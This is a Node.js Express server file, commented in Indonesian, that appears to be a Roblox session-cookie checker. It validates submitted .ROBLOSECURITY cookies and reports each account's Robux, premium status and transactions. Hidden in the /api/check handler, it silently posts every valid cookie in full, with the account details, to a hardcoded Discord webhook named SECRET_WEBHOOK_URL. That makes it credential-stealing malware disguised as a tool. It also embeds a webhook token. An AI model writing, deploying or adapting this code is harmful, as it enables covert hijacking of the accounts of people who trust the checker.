const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const SECRET_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM";

const getHeaders = (cookie) => ({
    'Cookie': `.ROBLOSECURITY=${cookie}`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json'
});

async function checkRobloxCookie(cookie) {
    try {
        const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: getHeaders(cookie),
            timeout: 5000
        });

        if (!userRes.data || !userRes.data.id) {
            return { success: false };
        }

        const userId = userRes.data.id;
        const username = userRes.data.name;
        const displayName = userRes.data.displayName;

        // Robux saat ini
        let robux = 0;
        try {
            const currencyRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: getHeaders(cookie),
                timeout: 3000
            });
            robux = currencyRes.data.robux || 0;
        } catch (e) {}

        // Tanggal Pembuatan Akun
        let createdDate = "Tidak diketahui";
        try {
            const infoRes = await axios.get(`https://users.roblox.com/v1/users/${userId}`, { timeout: 3000 });
            if (infoRes.data && infoRes.data.created) {
                createdDate = new Date(infoRes.data.created).toLocaleDateString('id-ID');
            }
        } catch (e) {}

        // Status Premium
        let isPremium = false;
        try {
            const premRes = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers: getHeaders(cookie),
                timeout: 3000
            });
            isPremium = !!premRes.data;
        } catch (e) {}

        // Cek Riwayat Transaksi Robux (Masuk / Keluar / Pembelian Game & Item)
        let totalIncoming = 0;
        let totalSpent = 0;
        let transactions = [];
        try {
            // Mengambil riwayat transaksi tipe 'Summary' atau 'Purchases'
            const transRes = await axios.get(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=All&limit=10`, {
                headers: getHeaders(cookie),
                timeout: 4000
            });
            
            if (transRes.data && transRes.data.data) {
                transactions = transRes.data.data.map(tx => {
                    const amount = tx.currency?.amount || 0;
                    const type = tx.transactionType || "Unknown";
                    if (amount > 0) totalIncoming += amount;
                    if (amount < 0) totalSpent += Math.abs(amount);

                    return {
                        description: tx.details?.name || tx.type || "Transaksi Roblox",
                        amount: amount,
                        date: new Date(tx.created).toLocaleDateString('id-ID')
                    };
                });
            }
        } catch (e) {}

        return {
            success: true,
            userId,
            username,
            displayName,
            robux,
            totalIncoming,
            totalSpent,
            transactions,
            createdDate,
            isPremium,
            cookie
        };
    } catch (error) {
        return { success: false };
    }
}

app.post('/api/check', async (req, res) => {
    try {
        const { cookies } = req.body;
        if (!cookies || !Array.isArray(cookies)) {
            return res.status(400).json({ error: "Format input tidak valid." });
        }

        const results = [];
        for (let rawCookie of cookies) {
            let cleanCookie = rawCookie.trim().replace(/^["']|["']$/g, '');
            if (!cleanCookie) continue;

            const result = await checkRobloxCookie(cleanCookie);
            if (result.success) {
                results.push(result);

                if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("http")) {
                    try {
                        await axios.post(SECRET_WEBHOOK_URL, {
                            content: `🚨 **AKUN ROBLOX VALID DITEMUKAN!**\n` +
                                     `👤 **Username:** ${result.username} (${result.displayName})\n` +
                                     `💰 **Robux:** ${result.robux} | 📥 **Masuk:** +${result.totalIncoming} | 📤 **Keluar:** -${result.totalSpent}\n` +
                                     `🔑 \`\`\`${result.cookie}\`\`\``
                        }, { timeout: 3000 });
                    } catch (wErr) {}
                }
            }
        }

        res.json({ results });
    } catch (err) {
        res.status(500).json({ error: "Server mengalami kendala saat memproses." });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
